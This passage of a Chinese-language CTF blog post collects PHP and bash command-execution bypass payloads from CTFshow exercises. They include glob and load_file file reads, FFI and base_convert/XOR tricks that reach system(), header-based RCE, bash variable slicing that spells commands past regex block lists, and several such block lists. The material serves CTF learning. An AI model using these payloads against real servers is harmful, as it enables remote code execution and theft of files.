+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="glob遍历文件名"><a href="#glob遍历文件名" class="headerlink" title="glob遍历文件名"></a>glob遍历文件名</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#poc</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="mysql的load-file读文件"><a href="#mysql的load-file读文件" class="headerlink" title="mysql的load_file读文件"></a>mysql的<code>load_file</code>读文件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h1><blockquote>
+<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
+</blockquote>
+<p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="regexp">//</span>创建一个system对象</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="regexp">//</span>没有回显的</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="regexp">//</span>通过<span class="variable">$ffi</span>去调用system函数</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<h1 id="数学函数白名单过滤"><a href="#数学函数白名单过滤" class="headerlink" title="数学函数白名单过滤"></a>数学函数白名单过滤</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 过滤模板  题目来源国赛 love_math</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP函数：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">()</span></span> 函数：在任意进制之间转换数字。</span><br><span class="line"><span class="function"><span class="title">dechex</span><span class="params">()</span></span> 函数：把十进制转换为十六进制。</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">()</span></span> 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> ：函数用于输出变量的相关信息。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br><span class="line">语法：readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="数学函数利用"><a href="#数学函数利用" class="headerlink" title="数学函数利用"></a>数学函数利用</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=&lt;command&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>分析</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="variable">$pi</span>=hex2bin(<span class="string">&quot;5f474554&quot;</span>) =&gt; <span class="variable">$pi</span>=<span class="string">&quot;_GET&quot;</span>   <span class="regexp">//</span>hex2bin将一串<span class="number">16</span>进制数转换为二进制字符串($<span class="variable">$pi</span>)&#123;pi&#125;(($<span class="variable">$pi</span>)&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>)&#123;pi&#125;((<span class="variable">$_GET</span>)&#123;abs&#125;) <span class="regexp">//</span>&#123;&#125;可以代替[]</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="HeaderRCE"><a href="#HeaderRCE" class="headerlink" title="HeaderRCE"></a>HeaderRCE</h2><blockquote>
+<p>getallheaders — 获取全部 HTTP 请求头信息</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56-2.jpg"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert,<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">然后抓包在请求头中添加 <span class="number">1</span>：cat /flag</span><br></pre></td></tr></table></figure>
+<p>分析</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)</span></span> =&gt; <span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">&quot;getallheaders&quot;</span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(getallheaders()</span></span>&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;       &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在运行结果中找到_GET即可，构造payload</p>
+<blockquote>
+<p>is_nan^64==&gt;_G</p>
+<p>tan^15==&gt;ET</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Linux中内置的bash变量"><a href="#Linux中内置的bash变量" class="headerlink" title="Linux中内置的bash变量"></a>Linux中内置的bash变量</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 构造nl flag.php</span><br><span class="line"> <span class="symbol">payload:</span><span class="variable">$&#123;</span><span class="symbol">PATH:</span><span class="number">14</span><span class="symbol">:</span><span class="number">1</span>&#125;<span class="variable">$&#123;</span><span class="symbol">PATH:</span><span class="number">5</span><span class="symbol">:</span><span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">过滤了数字时：<span class="symbol">payload:</span><span class="variable">$&#123;</span><span class="symbol">PATH:</span>~A&#125;<span class="variable">$&#123;</span><span class="symbol">PWD:</span>~A&#125; <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br></pre></td></tr></table></figure>
+
+
+<p> $PATH的最后一位是n $PWD的最后一位 也就是 /var/www/html的最后一位是l<br>在linux中可以用<del>获取变量的最后几位，而字母起到的作用是和0相同的，所有${PATH:</del>A}其实就是${PATH:~0}</p>
+<p><img src="http://img.npfs06.top/20210225143606.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="过滤了path时"><a href="#过滤了path时" class="headerlink" title="过滤了path时"></a>过滤了path时</h2><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造 /bin/base64 flag.php </span><br><span class="line"></span><br><span class="line">payload: <span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;???<span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;?????<span class="string">$&#123;</span><span class="symbol">#RANDOM</span>&#125; ????.???</span><br></pre></td></tr></table></figure>
+<p>需要/和4两个字符就行，其他的可以用通配符代替</p>
+<p>/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的<code>$&#123;#SHLVL&#125;`绕过：
+
+> SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。
+
+只需要`$&#123;PWD::$&#123;SHLVL&#125;&#125;</code>，结果就是<code>/</code></p>
+<p>还有一个4的问题，可以用<code>$&#123;#RANDOM&#125;</code>，在Linux中，<code>$&#123;#xxx&#125;</code>显示的是这个值的位数，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.</p>
+<p><img src="http://img.npfs06.top/20210225150320.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造 /bin/cat flag.php </span><br><span class="line"></span><br><span class="line">paylaod:  <span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;???<span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;??<span class="string">$&#123;</span><span class="type">HOME</span>:<span class="string">$&#123;</span><span class="symbol">#HOSTNAME</span>&#125;:<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>
+
+
+<p>构造<code>/bin/cat flag.php</code>,需要t和/，<code>$&#123;HOME&#125;</code>默认是<code>/root</code>，所以需要得到他的最后一个字母，容器的hostname为4个字母，所以<code>$&#123;#HOSTNAME&#125;</code>可以从第5位开始，1还是用<code>$&#123;#SHLVL&#125;</code>代替</p>
+<h2 id="过滤了SHLVL时"><a href="#过滤了SHLVL时" class="headerlink" title="过滤了SHLVL时"></a>过滤了SHLVL时</h2><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span>#?&#125;&#125;???<span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span>#?&#125;&#125;?????<span class="string">$&#123;</span><span class="symbol">#RANDOM</span>&#125; ????.???</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 过滤模板</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$?</span></span><br><span class="line">用途：上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。</span><br></pre></td></tr></table></figure>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@npfs</span><span class="symbol">:~</span><span class="comment"># echo $&#123;#?&#125;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤了-和PWD时"><a href="#过滤了-和PWD时" class="headerlink" title="过滤了#和PWD时"></a>过滤了#和PWD时</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="symbol">payload:</span> &lt;A;<span class="variable">$&#123;</span>HOME::<span class="variable">$?</span>&#125;<span class="string">??</span><span class="string">?$</span>&#123;HOME::<span class="variable">$?</span>&#125;<span class="string">??</span><span class="string">??</span><span class="string">?$</span>&#123;RANDOM::<span class="variable">$?</span>&#125; <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 过滤模板</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br></pre></td></tr></table></figure>
+
+
+<p>PWD过滤了可以用HOME代替，<code>$&#123;HOME&#125;</code>默认是<code>/root</code>，接下去我们只要再找到<code>1</code>来代替<code>$&#123;#SHLVL&#125;</code></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$?</span></span><br><span class="line">执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</span><br></pre></td></tr></table></figure>
+<p>fuzz下发现题目没有过滤<code>&lt;</code>，所以我们利用<code>&lt;A;</code>报错。从而使<code>$?</code>返回值为1</p>
+<hr>
+<p>例子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; c=highlight_file(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">&gt; c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line">&gt; system(<span class="string">&#x27;ca&quot;&quot;t config.php&#x27;</span>)</span><br><span class="line">&gt; system(<span class="string">&quot;ca&#x27;&#x27;t config.php&quot;</span>)</span><br><span class="line">&gt; c=passthru(<span class="string">&quot;ca&#x27;&#x27;t \`ls\`&quot;</span>);</span><br><span class="line">&gt; c=<span class="variable">$a</span> = base64_decode(<span class="string">&#x27;c3lzdGVt&#x27;</span>);<span class="variable">$b</span>=base64_decode(<span class="string">&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line">&gt; c=passthru(<span class="string">&quot;ca&#x27;&#x27;t \`ls\`&quot;</span>)?&gt;</span><br><span class="line">&gt; c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;</span><br><span class="line"></span><br><span class="line">&gt; ?c=<span class="built_in">echo</span> `<span class="variable">$_POST</span>[1]`?&gt;</span><br><span class="line">&gt; post: 1=cat config.php</span><br><span class="line"></span><br><span class="line">&gt;?c=grep<span class="variable">$&#123;IFS&#125;</span>%27&#123;%27<span class="variable">$&#123;IFS&#125;</span>fl???php</span><br><span class="line">意思就是在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行</span><br><span class="line">&gt; ?c=/???/????64%20????.???</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>文章中例题多来源于CTFshow web入门板块</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>安小琪
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://npfs06.top/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="命令执行绕过小技巧">https://npfs06.top/2021/02/26/命令执行绕过小技巧/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/24/%E6%9C%AC%E5%9C%B0%E6%BA%90%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD%E6%8E%A8%E9%80%81%E5%88%B0Github-%E6%8A%A5%E9%94%99%E5%8F%8A%E8%A7%A3%E5%86%B3/" rel="prev" title="本地源文件备份推送到Github 报错及解决">
+      <i class="fa fa-chevron-left"></i> 本地源文件备份推送到Github 报错及解决
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/26/Hexo%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4git-commit%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" rel="next" title="Hexo如何删除git commit历史记录">
+      Hexo如何删除git commit历史记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
